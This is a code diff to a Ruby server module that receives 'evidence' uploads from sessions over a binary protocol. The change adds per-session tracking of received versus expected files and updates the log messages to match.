@@ -304,7 +304,7 @@ module Commands
       # notify the transfer manager that an evidence is available
       EvidenceTransfer.instance.queue "#{session[:ident]}_#{session[:instance]}", id
 
-      trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes) - #{session[:count]}"
+      trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes) - #{session[:count]} of #{session[:total]}"
     rescue Exception => e
       trace :warn, "[#{peer}][#{session[:cookie]}] Evidence NOT saved: #{e.message}"
       return [PROTO_NO].pack('I')
@@ -321,10 +321,14 @@ module Commands
     # get the number of files
     num = message.slice!(0..3).unpack('I').first
 
+    # remember how many evidence will be transferred
+    session[:count] = 0
+    session[:total] = num
+
     # get the size of evidence
     size = message.unpack('Q').first
 
-    trace :info, "[#{peer}][#{session[:cookie]}] Evidence to be received: #{num} (#{size.to_s_bytes})"
+    trace :info, "[#{peer}][#{session[:cookie]}] Evidence queue size: #{num} (#{size.to_s_bytes})"
 
     return [PROTO_OK].pack('I') + [0].pack('I')
   end
